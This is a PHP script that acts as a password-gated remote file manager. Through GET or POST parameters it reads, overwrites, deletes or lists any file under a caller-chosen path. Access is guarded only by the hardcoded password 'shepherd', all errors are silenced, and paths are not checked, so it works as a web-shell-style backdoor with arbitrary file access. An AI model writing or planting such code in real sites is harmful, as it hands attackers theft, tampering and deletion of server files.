<?php 

error_reporting(0);

$path = "";
$read = "";
$write = "";
$data = "";
$delete = "";
$key = "";

if (($get = isset($_GET['get'])) == "TRUE")
{
	if (isset($_GET['path']))
	{
		$path = $_GET['path'] . "/";
	}
	if (isset($_GET['read']))
	{
		$read = $_GET['read'];
	}
	if (isset($_GET['write']))
	{
		$write = $_GET['write'];
	}
	if (isset($_GET['data']))
	{
		$data = $_GET['data'];
	}
	if (isset($_GET['delete']))
	{
		$delete = $_GET['delete'];
	}
	if (isset($_GET['key']))
	{
		$key = $_GET['key'];
	}
}

// path

if (isset($_POST['path']))
{
	$path = $_POST['path'] . "/";
}

// read file

if (isset($_POST['read']))
{
	$read = $_POST['read'];
}

// write file

if (isset($_POST['write']))
{
	$write = $_POST['write'];
}

// write data

if (isset($_POST['data']))
{
	$data = $_POST['data'];
}

$data = str_replace("\\", "", $data);

// delete file

if (isset($_POST['delete']))
{
	$delete = $_POST['delete'];
}

// post key

if (isset($_POST['key']))
{
	$key = $_POST['key'];
}


if (md5($key) == md5("shepherd"))
{
	if ($read != "")
	{
		// LOAD FILE
		
		$filename = $path . $read;
		
		if (($handle = fopen($filename, "r")) !== FALSE)
		{
			echo fread($handle, filesize($filename));
			fclose($handle);
		}
	}
	else if ($write != "")
	{
		// SAVE FILE
		
		$filename = $path . $write;
		
		if (($handle = fopen($filename, "w")) !== FALSE)
		{
			fwrite($handle, $data);
			fclose($handle);
			
			echo listFiles($path);
		}
	}
	else if ($delete != "")
	{
		// DELETE FILE
		
		$filename = $path . $delete;
		
		unlink($filename);
		echo listFiles($path);
	}
	else
	{
		// LIST FILES
		
		echo listFiles($path);
	}
}
else
{
	echo "denied";
}

function listFiles($dir)
{
	$files = array();
	$file = "";
	
	if (($handle = opendir($dir)) !== FALSE)
	{
		while ($file = readdir($handle))
		{
			if ($file != "." && $file != "..")
			{
				array_push($files, $file);
			}
		}
		closedir($handle);
	}
	return "files=" . implode(",", $files);
}

?>